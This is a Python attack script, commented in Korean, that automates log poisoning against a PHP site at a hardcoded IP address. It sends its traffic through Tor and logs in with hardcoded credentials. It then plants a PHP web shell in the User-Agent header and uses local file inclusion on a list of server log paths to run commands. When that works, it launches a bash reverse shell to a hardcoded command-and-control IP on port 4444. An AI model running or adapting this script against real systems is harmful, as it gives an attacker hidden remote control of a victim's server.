#!/usr/bin/env python3
"""
Log Poisoning 공격
User-Agent에 PHP 코드 주입 후 로그 파일을 LFI로 실행
"""

import requests
import time
import urllib.parse

def log_poisoning(target_ip="43.201.154.142", c2_ip="57.181.28.7", c2_port=4444):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] C2: {c2_ip}:{c2_port}")

    # 1. 로그인 (정상 User-Agent)
    print("\n[1] 로그인...")
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    })

    resp = session.post(
        f"{base_url}/login.php",
        data={'username': 'alice', 'password': 'alice2024'},
        allow_redirects=True,
        timeout=15
    )

    if 'index.php' not in resp.url:
        print("[-] 로그인 실패")
        return

    print("[+] 로그인 성공")
    time.sleep(2)

    # 2. User-Agent에 PHP 코드 주입
    print("\n[2] Log Poisoning 시도...")

    # 단순 웹쉘 코드
    php_code = '<?php system($_GET["x"]); ?>'

    print(f"[*] 주입할 코드: {php_code}")

    # User-Agent를 PHP 코드로 설정
    session.headers.update({
        'User-Agent': php_code
    })

    # 아무 페이지나 요청 (로그에 기록됨)
    print("[*] 로그에 코드 주입 중...")
    try:
        session.get(f"{base_url}/index.php", timeout=10)
        print("[+] 요청 완료 (로그에 기록됨)")
    except:
        print("[!] 요청 실패하지만 로그에는 기록되었을 수 있음")

    time.sleep(2)

    # 3. 로그 파일 경로 시도
    print("\n[3] 로그 파일 LFI로 실행 시도...")

    log_paths = [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/httpd/access_log',
        '/var/log/httpd/error_log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '../../../../../../var/log/apache2/access.log',
        '../../../../../../var/log/httpd/access_log',
        '/var/www/html/error.log',
        '../logs/access.log',
        '../logs/error.log',
    ]

    # User-Agent를 다시 정상으로
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    })

    for log_path in log_paths:
        encoded_path = urllib.parse.quote(log_path, safe='')

        # LFI + 명령 실행
        test_url = f"{base_url}/file.php?name={encoded_path}&x=id"

        print(f"\n[*] 시도: {log_path}")

        try:
            resp = session.get(test_url, timeout=10)

            if resp.status_code == 200:
                print(f"    Status: 200")

                # PHP 코드가 실행되었는지 확인
                if 'uid=' in resp.text or 'gid=' in resp.text:
                    print(f"    [+] ✅ 성공! 명령 실행됨!")
                    print(f"    응답: {resp.text[:200]}")

                    print(f"\n[+] 작동하는 경로: {log_path}")
                    print(f"[+] 명령 실행 URL:")
                    print(f"    {base_url}/file.php?name={encoded_path}&x=COMMAND")

                    # 리버스 쉘 시도
                    print(f"\n[?] 리버스 쉘을 시도할까요?")
                    print(f"[!] C2 리스너 준비: nc -lvnp {c2_port}")

                    choice = input("Enter로 시도, n으로 건너뛰기: ").strip().lower()

                    if choice != 'n':
                        reverse_shell = f"bash -c 'bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1'"
                        shell_url = f"{base_url}/file.php?name={encoded_path}&x={urllib.parse.quote(reverse_shell)}"

                        try:
                            session.get(shell_url, timeout=3)
                        except:
                            print("[+] 타임아웃 (연결되었을 수 있음)")

                    return

                elif len(resp.text) > 100:
                    print(f"    [?] 로그 파일 읽혔지만 명령 실행은 안 됨")
                    print(f"    응답 길이: {len(resp.text)} bytes")

            elif resp.status_code == 403:
                print(f"    403 Forbidden")
            else:
                print(f"    Status: {resp.status_code}")

        except Exception as e:
            print(f"    오류: {str(e)[:50]}")

        time.sleep(1)

    print("\n[-] 모든 로그 경로 실패")
    print("[!] 로그 파일에 접근할 수 없거나, PHP 코드가 실행되지 않음")

if __name__ == "__main__":
    log_poisoning()
